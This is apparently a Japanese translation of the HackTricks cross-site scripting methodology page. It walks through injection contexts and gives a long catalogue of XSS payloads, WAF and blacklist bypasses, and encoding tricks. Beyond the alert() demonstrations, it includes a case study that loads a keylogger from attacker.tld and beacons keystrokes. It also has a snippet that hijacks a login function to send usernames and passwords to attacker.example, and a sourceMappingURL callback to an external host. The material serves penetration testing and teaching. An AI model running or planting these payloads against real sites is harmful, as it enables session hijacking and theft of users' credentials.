# XSS (Cross Site Scripting)

{{#include ../../banners/hacktricks-training.md}}

## 方法論

1. あなたが制御できる**任意の値**（_parameters_, _path_, _headers_?, _cookies_?）がHTMLに**反映**されているか、または**JS**コードで**使用**されているかを確認する。
2. 反映／使用されている**コンテキストを特定する**。
3. もし**反映されている**なら
1. **どの記号が使えるか**を確認し、それに応じてペイロードを準備する:
1. **raw HTML**では:
1. 新しいHTMLタグを作成できるか？
2. `javascript:`プロトコルをサポートするイベントや属性が使えるか？
3. 保護をバイパスできるか？
4. HTMLコンテンツがクライアント側のJSエンジン（_AngularJS_, _VueJS_, _Mavo_...）で解釈されている場合、[**Client Side Template Injection**](../client-side-template-injection-csti.md)を悪用できる可能性がある。
5. JSコードを実行するHTMLタグを作れない場合、[**Dangling Markup - HTML scriptless injection**](../dangling-markup-html-scriptless-injection/index.html)を悪用できるかもしれない。
2. **HTMLタグ内**では:
1. 属性コンテキストからraw HTMLコンテキストへ抜け出せるか？
2. JSコードを実行するイベント／属性を作成できるか？
3. 取り込まれている属性はJS実行をサポートするか？
4. 保護をバイパスできるか？
3. **JavaScriptコード内**では:
1. `<script>`タグを脱出できるか？
2. 文字列を脱出して別のJSコードを実行できるか？
3. 入力がテンプレートリテラル `` の中にあるか？
4. 保護をバイパスできるか？
4. 実行されるJavascript **関数**
1. 実行する関数名を指定できる。例: `?callback=alert(1)`
4. もし**使用されている**なら:
1. **DOM XSS**を悪用できる可能性がある。あなたの入力がどのようにコントロールされ、どのsinkで使われているかに注意すること。

複雑なXSSに取り組む際、次の内容が役に立つかもしれない:


{{#ref}}
debugging-client-side-js.md
{{#endref}}

## 反映された値

XSSを成功させるために最初に見つけるべきは、ウェブページに**反映されているあなたが制御する値**である。

- **中間的に反映される**: パラメータやパスの値がウェブページに反映されている場合、**Reflected XSS**を悪用できる可能性がある。
- **保存されて反映される**: あなたが制御する値がサーバに保存され、ページにアクセスするたびに反映されるなら、**Stored XSS**を悪用できる可能性がある。
- **JS経由でアクセスされる**: あなたが制御する値がJSでアクセスされている場合、**DOM XSS**を悪用できる可能性がある。

## コンテキスト

XSSを試す際、まず知るべきは**どこに入力が反映されているか**である。コンテキストによって、任意のJSコードを実行する方法が変わる。

### Raw HTML

入力が**raw HTML**ページに反映される場合、JSコードを実行するために何らかの**HTMLタグ**を悪用する必要がある: `<img , <iframe , <svg , <script` ... これらは使用可能な多くのHTMLタグの一部にすぎない。\
また、[Client Side Template Injection](../client-side-template-injection-csti.md)も念頭に置くこと。

### HTMLタグの属性内

入力がタグの属性値の中に反映される場合、次を試せる:

1. 属性とタグから**エスケープして（raw HTMLに出る）**新しいHTMLタグを作成し悪用する: `"><img [...]`
2. **属性からはエスケープできるがタグからは出られない場合**（`>`がエンコードまたは削除されている）、タグによってはJSを実行する**イベント**を作成できる: `" autofocus onfocus=alert(1) x="`
3. **属性からもエスケープできない場合**（`"`がエンコードまたは削除されている）、反映されている**どの属性か**、**値全体を制御できるか一部だけか**によって悪用方法が変わる。例えば、`onclick=`のようなイベント属性を制御できれば、クリック時に任意のコードを実行できる。別の興味深い例は`href`属性で、`javascript:`プロトコルを使って任意のコードを実行できる: **`href="javascript:alert(1)"`**
4. 入力が「**悪用不可タグ**」内で反映される場合、**`accesskey`**トリックを試して脆弱性を悪用できるかもしれない（これを利用するには何らかのソーシャルエンジニアリングが必要）: **`" accesskey="x" onclick="alert(1)" x="`**

#### WAF越しの属性のみのログインXSS

企業のSSOログインページがOAuthの`service`パラメータを`<a id="forgot_btn" ...>`の`href`属性内に反映していた。`<`と`>`はHTMLエンコードされていたが、二重引用符はされていなかったため、攻撃者は属性を閉じて同じ要素を再利用し、`" onfocus="payload" x="`のようなハンドラを注入できた。

1. **ハンドラを注入する:** `onclick="print(1)"`のような単純なペイロードはブロックされたが、WAFはインライン属性中の最初のJavaScript文のみを検査していた。無害な式を括弧で囲んでセミコロンを付け、その後に本当のペイロードを置くことで実行を可能にした: `onfocus="(history.length);malicious_code_here"`。
2. **自動トリガー:** ブラウザはフラグメントと一致する`id`を持つ要素にフォーカスするので、exploit URLに`#forgot_btn`を追加すると、ページロード時にアンカーがフォーカスされ、クリック不要でハンドラが実行される。
3. **インラインのスタブを小さく保つ:** 対象は既にjQueryを搭載していた。ハンドラは単に`$.getScript(...)`でリクエストをブートストラップするだけで十分で、完全なキー ロガー本体は攻撃者のサーバ上に置かれていた。

**引用符なしで文字列を作る**

シングルクォートはURLエンコードされて返され、エスケープされたダブルクォートは属性を壊してしまったため、ペイロードはすべての文字列を`String.fromCharCode`で生成した。任意のURLを属性に貼り付ける前に文字コードに変換するのを簡単にするヘルパー関数がある:
```javascript
function toCharCodes(str){
return `const url = String.fromCharCode(${[...str].map(c => c.charCodeAt(0)).join(',')});`
}
console.log(toCharCodes('https://attacker.tld/keylogger.js'))
```
結果として得られた属性は次のようでした:
```html
onfocus="(history.length);const url=String.fromCharCode(104,116,116,112,115,58,47,47,97,116,116,97,99,107,101,114,46,116,108,100,47,107,101,121,108,111,103,103,101,114,46,106,115);$.getScript(url),function(){}"
```
**なぜこれが資格情報を盗むのか**

外部スクリプト（攻撃者が制御するホストまたは Burp Collaborator からロードされる）が `document.onkeypress` をフックし、キー入力をバッファし、1秒ごとに `new Image().src = collaborator_url + keys` を発行していました。XSS は認証されていないユーザーにのみ発動するため、機微な操作はログインフォームそのものであり — 被害者が「Login」を押さなくても攻撃者はユーザー名とパスワードをキーログしてしまいます。

クラス名を制御すると Angular が XSS を実行してしまう奇妙な例：
```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```
### JavaScript コード内

この場合、あなたの入力は **`<script> [...] </script>`** タグ内の HTML ページ、`.js` ファイル内、または **`javascript:`** プロトコルを使った属性内で反映されます:

- **`<script> [...] </script>`** タグ内で反映される場合、入力がどんな種類の引用符内にあっても、`</script>` を注入してこのコンテキストから脱出することを試みることができます。これはブラウザがまず HTML タグを解析し、その後コンテンツを処理するため、注入した `</script>` タグが HTML コード内にあることに気付かないからです。
- If reflected **inside a JS string** and the last trick isn't working you would need to **exit** the string, **execute** your code and **reconstruct** the JS code（前のトリックが効かない場合は、文字列を抜け出し、コードを実行し、JS コードを再構築する必要があります。エラーがあると実行されません）:
- `'-alert(1)-'`
- `';-alert(1)//`
- `\';alert(1)//`
- If reflected inside template literals you can **embed JS expressions** using `${ ... }` syntax: `` var greetings = `Hello, ${alert(1)}` ``
- **Unicode encode** は **valid javascript code** を記述するのに有効です:
```javascript
alert(1)
alert(1)
alert(1)
```
#### Javascript Hoisting

Javascript Hoistingは、使用後に関数、変数、またはクラスを宣言できる機会を指し、XSSが未宣言の変数や関数を使用しているシナリオを悪用できるようにします。\
**詳しくは次のページを参照してください：**


{{#ref}}
js-hoisting.md
{{#endref}}

### Javascript Function

多くのウェブページには、**実行する関数名をパラメータとして受け取る**エンドポイントがあります。現実でよく見かける例は `?callback=callbackFunc` のようなものです。

ユーザが直接渡した値が実行されようとしているかを調べる良い方法は、**パラメータ値を変更する**（例：'Vulnerable' にする）ことと、コンソールに次のようなエラーが出ていないか確認することです：

![](<../../images/image (711).png>)

脆弱であれば、値を送るだけで**アラートを発生させる**ことができます: **`?callback=alert(1)`**。しかし、この種のエンドポイントは一般的に文字、数字、ドット、アンダースコア（**`[\w\._]`**）のみを許可するようにコンテンツを**検証**します。

それでも、その制限下でいくつかの操作を行うことは可能です。これは、有効な文字を使って**DOM内の任意の要素にアクセス**できるためです：

![](<../../images/image (747).png>)

いくつかの有用な関数：
```
firstElementChild
lastElementChild
nextElementSibiling
lastElementSibiling
parentElement
```
You can also try to **trigger JavaScript functions** directly: `obj.sales.delOrders`.

However, usually the endpoints executing the indicated function are endpoints without much interesting DOM, **同一オリジンの他のページ** will have a **more interesting DOM** to perform more actions.

Therefore, in order to **abuse this vulnerability in a different DOM** the **Same Origin Method Execution (SOME)** exploitation was developed:


{{#ref}}
some-same-origin-method-execution.md
{{#endref}}

### DOM

**JS code** が、攻撃者により制御される `location.href` のようなデータを**安全でない方法で使用している**ことがあります。攻撃者はこれを悪用して任意の JS コードを実行できます。


{{#ref}}
dom-xss.md
{{#endref}}

### **Universal XSS**

この種の XSS は **どこにでも** 見つかる可能性があります。これらは単にウェブアプリケーションのクライアント側の悪用に依存するものではなく、**任意の** **コンテキスト** に依存します。この種の **任意の JavaScript 実行** は、**RCE** を取得したり、クライアントやサーバ上の **任意のファイル** を**読み取る**などに悪用される可能性があります。\
いくつかの **例**:


{{#ref}}
server-side-xss-dynamic-pdf.md
{{#endref}}


{{#ref}}
../../network-services-pentesting/pentesting-web/electron-desktop-apps/
{{#endref}}

## WAF bypass encoding image

![from https://twitter.com/hackerscrolls/status/1273254212546281473?s=21](<../../images/EauBb2EX0AERaNK (1).jpg>)

## raw HTML 内への注入

あなたの入力が **HTML ページ内に反映される** またはこのコンテキストで HTML コードをエスケープして注入できる場合、最初に行うべきことは、新しいタグを作成するために `<` を悪用できるかを確認することです。つまり、その **char** が反映されるか試し、それが **HTML encoded** されているのか、**deleted** されているのか、あるいは **reflected without changes** のかを確認してください。**最後の場合のみこのケースを悪用できます**。\
この場合は [**Client Side Template Injection**](../client-side-template-injection-csti.md) も**念頭に置いてください**。\
_**注: HTML コメントは `-->` または `--!>` を使って閉じることができます**_

In this case and if no ブラック/ホワイトリスティング is used, you could use payloads like:
```html
<script>
alert(1)
</script>
<img src="x" onerror="alert(1)" />
<svg onload=alert('XSS')>
```
しかし、tags/attributes black/whitelisting が使用されている場合、作成できるタグを **brute-force which tags** で探す必要があります。\
どのタグが許可されているか **located which tags are allowed** を特定したら、見つかった有効なタグ内の属性やイベントを **brute-force attributes/events** して、コンテキストをどのように攻撃できるか確認する必要があります。

### Tags/Events brute-force

Go to [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) and click on _**Copy tags to clipboard**_. Then, send all of them using Burp intruder and check if any tags wasn't discovered as malicious by the WAF. Once you have discovered which tags you can use, you can **brute force all the events** using the valid tags (in the same web page click on _**Copy events to clipboard**_ and follow the same procedure as before).

### カスタムタグ

有効な HTML タグが見つからない場合、**カスタムタグを作成する** を試して、`onfocus` 属性で JS コードを実行できます。XSS リクエストでは、URL の末尾に `#` を付けてページがそのオブジェクトに **フォーカス** し、コードを **実行** するようにします:
```
/?search=<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x
```
### Blacklist Bypasses

もし何らかの blacklist が使われている場合、いくつかの馬鹿げたトリックでそれを bypass してみることができます:
```javascript
//Random capitalization
<script> --> <ScrIpT>
<img --> <ImG

//Double tag, in case just the first match is removed
<script><script>
<scr<script>ipt>
<SCRscriptIPT>alert(1)</SCRscriptIPT>

//You can substitude the space to separate attributes for:
/
/*%00/
/%00*/
%2F
%0D
%0C
%0A
%09

//Unexpected parent tags
<svg><x><script>alert('1'&#41</x>

//Unexpected weird attributes
<script x>
<script a="1234">
<script ~~~>
<script/random>alert(1)</script>
<script      ///Note the newline
>alert(1)</script>
<scr\x00ipt>alert(1)</scr\x00ipt>

//Not closing tag, ending with " <" or " //"
<iframe SRC="javascript:alert('XSS');" <
<iframe SRC="javascript:alert('XSS');" //

//Extra open
<<script>alert("XSS");//<</script>

//Just weird an unexpected, use your imagination
<</script/script><script>
<input type=image src onerror="prompt(1)">

//Using `` instead of parenthesis
onerror=alert`1`

//Use more than one
<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //
```
### Length bypass (small XSSs)

> [!NOTE] > **さまざまな環境向けの tiny XSS payload** [**can be found here**](https://github.com/terjanq/Tiny-XSS-Payloads) と [**here**](https://tinyxss.terjanq.me).
```html
<!-- Taken from the blog of Jorge Lajara -->
<svg/onload=alert``> <script src=//aa.es> <script src=//℡㏛.pw>
```
The last one is using 2 unicode characters which expands to 5: telsr\
More of these characters can be found [here](https://www.unicode.org/charts/normalization/).\
To check in which characters are decomposed check [here](https://www.compart.com/en/unicode/U+2121).

### Click XSS - Clickjacking

脆弱性を悪用するために、事前にデータが入力されたリンクやフォームを**userにクリックさせる**必要がある場合、ページが脆弱であれば[**abuse Clickjacking**](../clickjacking.md#xss-clickjacking)を試してみてください。

### Impossible - Dangling Markup

もし単に **it's impossible to create an HTML tag with an attribute to execute JS code** と考えているだけなら、[**Danglig Markup** ](../dangling-markup-html-scriptless-injection/index.html)を確認してください。なぜなら、脆弱性を **exploit** して **without** executing **JS** code できる可能性があるからです。

## HTMLタグ内への注入

### タグ内／属性値からのエスケープ

If you are in **inside a HTML tag**, the first thing you could try is to **escape** from the tag and use some of the techniques mentioned in the [previous section](#injecting-inside-raw-html) to execute JS code.\
If you **cannot escape from the tag**, you could create new attributes inside the tag to try to execute JS code, for example using some payload like (_note that in this example double quotes are use to escape from the attribute, you won't need them if your input is reflected directly inside the tag_):
```bash
" autofocus onfocus=alert(document.domain) x="
" onfocus=alert(1) id=x tabindex=0 style=display:block>#x #Access http://site.com/?#x t
```
**スタイルイベント**
```python
<p style="animation: x;" onanimationstart="alert()">XSS</p>
<p style="animation: x;" onanimationend="alert()">XSS</p>

#ayload that injects an invisible overlay that will trigger a payload if anywhere on the page is clicked:
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 5000;" onclick="alert(1)"></div>
#moving your mouse anywhere over the page (0-click-ish):
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 5000;" onmouseover="alert(1)"></div>
```
### 属性内

たとえ**属性から脱出できない**（`"` がエンコードまたは削除されている）場合でも、値が反映される**どの属性か**や、**値全体を制御しているか一部だけか**によって、それを悪用することができます。**例えば**、`onclick=` のようなイベントを制御できるなら、クリック時に任意のコードを実行させることができます。\
もうひとつの興味深い**例**は `href` 属性で、`javascript:` プロトコルを使って任意のコードを実行できます: **`href="javascript:alert(1)"`**

**HTMLエンコード/URLエンコードを使用したイベント内のバイパス**

HTMLタグ属性の値内にある**HTMLエンコードされた文字**は実行時に**デコードされます**。したがって次のようなものが有効になります（ペイロードは太字）: `<a id="author" href="http://none" onclick="var tracker='http://foo?`**`&apos;-alert(1)-&apos;`**`';">Go Back </a>`

なお、**どの種類のHTMLエンコードでも有効です**:
```javascript
//HTML entities
&apos;-alert(1)-&apos;
//HTML hex without zeros
&#x27-alert(1)-&#x27
//HTML hex with zeros
&#x00027-alert(1)-&#x00027
//HTML dec without zeros
&#39-alert(1)-&#39
//HTML dec with zeros
&#00039-alert(1)-&#00039

<a href="javascript:var a='&apos;-alert(1)-&apos;'">a</a>
<a href="&#106;avascript:alert(2)">a</a>
<a href="jav&#x61script:alert(3)">a</a>
```
**注意: URL encode も使えます:**
```python
<a href="https://example.com/lol%22onmouseover=%22prompt(1);%20img.png">Click</a>
```
**イベント内での Unicode encode を使った Bypass**
```javascript
//For some reason you can use unicode to encode "alert" but not "(1)"
<img src onerror=\u0061\u006C\u0065\u0072\u0074(1) />
<img src onerror=\u{61}\u{6C}\u{65}\u{72}\u{74}(1) />
```
### 属性内の特殊プロトコル

ここでは、場所によってプロトコル **`javascript:`** や **`data:`** を使用して **任意のJSコードを実行** できます。 一部はユーザーの操作を必要とするものもあれば、必要としないものもあります。
```javascript
javascript:alert(1)
JavaSCript:alert(1)
javascript:%61%6c%65%72%74%28%31%29 //URL encode
javascript&colon;alert(1)
javascript&#x003A;alert(1)
javascript&#58;alert(1)
javascript:alert(1)
java        //Note the new line
script:alert(1)

data:text/html,<script>alert(1)</script>
DaTa:text/html,<script>alert(1)</script>
data:text/html;charset=iso-8859-7,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
data:text/html;charset=UTF-8,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
data:text/html;charset=thing;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg
data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==
```
**これらのプロトコルを注入できる場所**

**一般的に** `javascript:` プロトコルは **属性 `href` を受け入れる任意のタグで使用できます**、および **ほとんど** の **属性 `src`** を受け入れるタグでも使用できます（ただし `<img` は除く）
```html
<a href="javascript:alert(1)">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
<form action="javascript:alert(1)"><button>send</button></form>
<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
<object data=javascript:alert(3)>
<iframe src=javascript:alert(2)>
<embed src=javascript:alert(1)>

<object data="data:text/html,<script>alert(5)</script>">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
<iframe src="data:text/html,<script>alert(5)</script>"></iframe>

//Special cases
<object data="//hacker.site/xss.swf"> .//https://github.com/evilcos/xss.swf
<embed code="//hacker.site/xss.swf" allowscriptaccess=always> //https://github.com/evilcos/xss.swf
<iframe srcdoc="<svg onload=alert(4);>">
```
**その他の難読化トリック**

_**この場合、前節で説明したHTMLエンコーディングおよびUnicodeエンコーディングのトリックは、属性内にいるため有効です。**_
```javascript
<a href="javascript:var a='&apos;-alert(1)-&apos;'">
```
さらに、これらの場合にはもう一つの**nice trick**があります：**`javascript:...` の内部の入力がURLエンコードされていても、実行される前にURLデコードされます。** つまり、もし**escape**して**string**から**single quote**を使って抜け出す必要があり、入力が**URLエンコードされている**のが見えても、覚えておいてください、**問題ありません、**実行時には**single quote**として**解釈されます。
```javascript
&apos;-alert(1)-&apos;
%27-alert(1)-%27
<iframe src=javascript:%61%6c%65%72%74%28%31%29></iframe>
```
注意：もし任意の順序で `URLencode + HTMLencode` を**両方使って** **payload** をエンコードしようとしても、**動作し** **ません**が、**payload の中で混在させる**ことは可能です。

**`javascript:` と組み合わせた Hex と Octal encode の使用**

少なくとも `iframe` の `src` 属性内に **Hex** や **Octal encode** を使用して、**JS を実行するための HTML タグ** を記述できます：
```javascript
//Encoded: <svg onload=alert(1)>
// This WORKS
<iframe src=javascript:'\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e' />
<iframe src=javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76' />

//Encoded: alert(1)
// This doesn't work
<svg onload=javascript:'\x61\x6c\x65\x72\x74\x28\x31\x29' />
<svg onload=javascript:'\141\154\145\162\164\50\61\51' />
```
### Reverse tab nabbing
```javascript
<a target="_blank" rel="opener"
```
任意の URL を、**`<a href=`** タグ（**`target="_blank" and rel="opener"`** 属性を含む）に注入できる場合は、この挙動を悪用するために次のページを確認してください:

{{#ref}}
../reverse-tab-nabbing.md
{{#endref}}

### on Event Handlers のバイパス

まずは、有用な **"on" event handlers** を確認するためにこのページ（https://portswigger.net/web-security/cross-site-scripting/cheat-sheet）を参照してください。\
もしブラックリストによりこれらの event handlers を作成できない場合、次のバイパスを試してみてください:
```javascript
<svg onload%09=alert(1)> //No safari
<svg %09onload=alert(1)>
<svg %09onload%20=alert(1)>
<svg onload%09%20%28%2c%3b=alert(1)>

//chars allowed between the onevent and the "="
IExplorer: %09 %0B %0C %020 %3B
Chrome: %09 %20 %28 %2C %3B
Safari: %2C %3B
Firefox: %09 %20 %28 %2C %3B
Opera: %09 %20 %2C %3B
Android: %09 %20 %28 %2C %3B
```
### XSS における "Unexploitable tags" (hidden input, link, canonical, meta)

こちらの [**here**](https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags) より、**hidden inputs を悪用できるようになりました:**
```html
<button popvertarget="x">Click me</button>
<input type="hidden" value="y" popover id="x" onbeforetoggle="alert(1)" />
```
そして **meta tags**:
```html
<!-- Injection inside meta attribute-->
<meta
name="apple-mobile-web-app-title"
content=""
Twitter
popover
id="newsletter"
onbeforetoggle="alert(2)" />
<!-- Existing target-->
<button popovertarget="newsletter">Subscribe to newsletter</button>
<div popover id="newsletter">Newsletter popup</div>
```
参照: [**here**](https://portswigger.net/research/xss-in-hidden-input-fields): **XSS payload inside a hidden attribute** を実行できます。これは **被害者** を **説得** して **キーの組み合わせ** を押させられる場合に限ります。Firefox（Windows/Linux）ではキーの組み合わせは **ALT+SHIFT+X**、OS Xでは **CTRL+ALT+X** です。access key attribute の別のキーを使って別のキー組み合わせを指定できます。攻撃ベクトルは以下の通り:
```html
<input type="hidden" accesskey="X" onclick="alert(1)">
```
**XSSペイロードは次のようなものになります: `" accesskey="x" onclick="alert(1)" x="`**

### ブラックリストバイパス

このセクションではすでにさまざまなエンコーディングを使ったトリックが紹介されています。**どこで以下を使えるかを確認するために戻ってください:** 

- **HTML encoding (HTML tags)**
- **Unicode encoding (can be valid JS code):** `\u0061lert(1)`
- **URL encoding**
- **Hex and Octal encoding**
- **data encoding**

**Bypasses for HTML tags and attributes**

Read the[ Blacklist Bypasses of the previous section](#blacklist-bypasses).

**Bypasses for JavaScript code**

Read the J[avaScript bypass blacklist of the following section](#javascript-bypass-blacklists-techniques).

### CSS-Gadgets

ウェブのごく小さな部分で**XSS**を見つけ、何らかのインタラクションが必要な場合（フッターの小さなリンクにonmouseover要素がある場合など）、その要素が占めるスペースを**変更して**リンクが発火する確率を最大化することができます。

例えば、要素に次のようなスタイルを追加することができます: `position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: red; opacity: 0.5`

しかし、WAFがstyle属性をフィルタリングしている場合は、CSS Styling Gadgetsを使用できます。例えば、次のようなスタイルを見つけた場合:

> .test {display:block; color: blue; width: 100%\}

and

> \#someid {top: 0; font-family: Tahoma;}

これでリンクを変更して次の形にできます:

> \<a href="" id=someid class=test onclick=alert() a="">

This trick was taken from [https://medium.com/@skavans\_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703](https://medium.com/@skavans_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703)

## JavaScriptコード内に注入する

この場合、あなたの**入力**は`.js`ファイルのJSコード内、または`<script>...</script>`タグ内、JSを実行できるHTMLイベント内、あるいは`javascript:`プロトコルを受け入れる属性内部に**反映されます**。

### \<script>タグのエスケープ

もしあなたのコードが`<script> [...] var input = 'reflected data' [...] </script>`の中に挿入されるなら、簡単に**`<script>`の閉じをエスケープする**ことができます:
```javascript
</script><img src=1 onerror=alert(document.domain)>
```
この例では、**シングルクォートを閉じてすらいない**ことに注意してください。これは、**HTMLの解析はまずbrowserによって行われる**ためで、scriptのブロックを含むページ要素の識別が行われます。埋め込まれたスクリプトを理解して実行するためのJavaScriptの解析は、その後で初めて行われます。

### JSコード内

もし `<>` がサニタイズされていても、入力が**置かれている**箇所で文字列を**エスケープ**し、**任意のJSを実行**できます。JSの構文を**修正する**ことが重要です。エラーがあると、JSコードは実行されません:
```
'-alert(document.domain)-'
';alert(document.domain)//
\';alert(document.domain)//
```
#### JS-in-JS string break → inject → repair pattern

ユーザー入力が引用符で囲まれたJavaScript文字列内に入る場合（例：サーバー側でechoしてインラインスクリプトに出力するケース）、文字列を終了させてコードを注入し、構文を修復して解析を有効な状態に保つことができます。一般的なスケルトン:
```
"            // end original string
;            // safely terminate the statement
<INJECTION>  // attacker-controlled JS
; a = "      // repair and resume expected string/statement
```
脆弱なパラメータがJS文字列に反映される場合のURLパターンの例：
```
?param=test";<INJECTION>;a="
```
これはHTMLコンテキストに触れずに attacker JS を実行します（pure JS-in-JS）。フィルタがキーワードをブロックする場合は、下の blacklist bypasses と組み合わせてください。

### Template literals ``

JSでは、シングルクオートやダブルクオート以外に**strings**を構築するために**backticks** **` `` `** も受け付けます。これは template literals と呼ばれ、`${ ... }` 構文を使って**embedded JS expressions**を埋め込めるためです.\
したがって、もしあなたの入力が backticks を使った JS string の内部に**reflected**されている場合、`${ ... }`構文を悪用して**arbitrary JS code**を実行できます:

これは次のように**悪用**できます:
```javascript
;`${alert(1)}``${`${`${`${alert(1)}`}`}`}`
```

```javascript
// This is valid JS code, because each time the function returns itself it's recalled with ``
function loop() {
return loop
}
loop``
```
### エンコードされたコードの実行
```html
<script>\u0061lert(1)</script>
<svg><script>alert&lpar;'1'&rpar;
<svg><script>alert(1)</script></svg>  <!-- The svg tags are neccesary
<iframe srcdoc="<SCRIPT>alert(1)</iframe>">
```
#### Deliverable payloads と eval(atob())、およびスコープのニュアンス

URL を短く保ち、単純なキーワードフィルターを回避するために、実際のロジックを base64 エンコードし、`eval(atob('...'))` で評価できます。`alert`、`eval`、`atob` のような識別子が単純なキーワードフィルターでブロックされる場合、ブラウザで同一にコンパイルされるが文字列マッチングフィルターを回避する Unicode エスケープされた識別子を使用します:
```
\u0061\u006C\u0065\u0072\u0074(1)                      // alert(1)
\u0065\u0076\u0061\u006C(\u0061\u0074\u006F\u0062('BASE64'))  // eval(atob('...'))
```
重要なスコーピングの注意点: `const`/`let` が `eval()` 内で宣言されるとブロックスコープになり、グローバルを生成しません；後続のスクリプトからはアクセスできません。必要な場合は、動的に挿入した `<script>` 要素を使って、グローバルで再束縛できないフックを定義してください（例: フォームハンドラを hijack するため）:
```javascript
var s = document.createElement('script');
s.textContent = "const DoLogin = () => {const pwd = Trim(FormInput.InputPassword.value); const user = Trim(FormInput.InputUtente.value); fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));}";
document.head.appendChild(s);
```
参照: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval

### Unicode Encode JS execution
```javascript
alert(1)
alert(1)
alert(1)
```
### JavaScript ブラックリスト回避手法

**文字列**
```javascript
"thisisastring"
'thisisastrig'
`thisisastring`
/thisisastring/ == "/thisisastring/"
/thisisastring/.source == "thisisastring"
"\h\e\l\l\o"
String.fromCharCode(116,104,105,115,105,115,97,115,116,114,105,110,103)
"\x74\x68\x69\x73\x69\x73\x61\x73\x74\x72\x69\x6e\x67"
"\164\150\151\163\151\163\141\163\164\162\151\156\147"
"\u0074\u0068\u0069\u0073\u0069\u0073\u0061\u0073\u0074\u0072\u0069\u006e\u0067"
"\u{74}\u{68}\u{69}\u{73}\u{69}\u{73}\u{61}\u{73}\u{74}\u{72}\u{69}\u{6e}\u{67}"
"\a\l\ert\(1\)"
atob("dGhpc2lzYXN0cmluZw==")
eval(8680439..toString(30))(983801..toString(36))
```
**特殊エスケープ**
```javascript
"\b" //backspace
"\f" //form feed
"\n" //new line
"\r" //carriage return
"\t" //tab
"\b" //backspace
"\f" //form feed
"\n" //new line
"\r" //carriage return
"\t" //tab
// Any other char escaped is just itself
```
**JSコード内での空白の置換**
```javascript
<TAB>
/**/
```
**JavaScript comments (から** [**JavaScript Comments**](#javascript-comments) **トリック)**
```javascript
//This is a 1 line comment
/* This is a multiline comment*/
<!--This is a 1line comment
#!This is a 1 line comment, but "#!" must to be at the beggining of the first line
-->This is a 1 line comment, but "-->" must to be at the beggining of the first line
```
**JavaScript new lines (from** [**JavaScript new line**](#javascript-new-lines) **トリック)**
```javascript
//Javascript interpret as new line these chars:
String.fromCharCode(10)
alert("//\nalert(1)") //0x0a
String.fromCharCode(13)
alert("//\ralert(1)") //0x0d
String.fromCharCode(8232)
alert("//\u2028alert(1)") //0xe2 0x80 0xa8
String.fromCharCode(8233)
alert("//\u2029alert(1)") //0xe2 0x80 0xa9
```
**JavaScript の空白文字**
```javascript
log=[];
function funct(){}
for(let i=0;i<=0x10ffff;i++){
try{
eval(`funct${String.fromCodePoint(i)}()`);
log.push(i);
}
catch(e){}
}
console.log(log)
//9,10,11,12,13,32,160,5760,8192,8193,8194,8195,8196,8197,8198,8199,8200,8201,8202,8232,8233,8239,8287,12288,65279

//Either the raw characters can be used or you can HTML encode them if they appear in SVG or HTML attributes:
<img/src/onerror=alert&#65279;(1)>
```
**コメント内の Javascript**
```javascript
//If you can only inject inside a JS comment, you can still leak something
//If the user opens DevTools request to the indicated sourceMappingURL will be send

//# sourceMappingURL=https://evdr12qyinbtbd29yju31993gumlaby0.oastify.com
```
**括弧なしの JavaScript**
```javascript
// By setting location
window.location='javascript:alert\x281\x29'
x=new DOMMatrix;matrix=alert;x.a=1337;location='javascript'+':'+x
// or any DOMXSS sink such as location=name

// Backtips
// Backtips pass the string as an array of lenght 1
alert`1`

// Backtips + Tagged Templates + call/apply
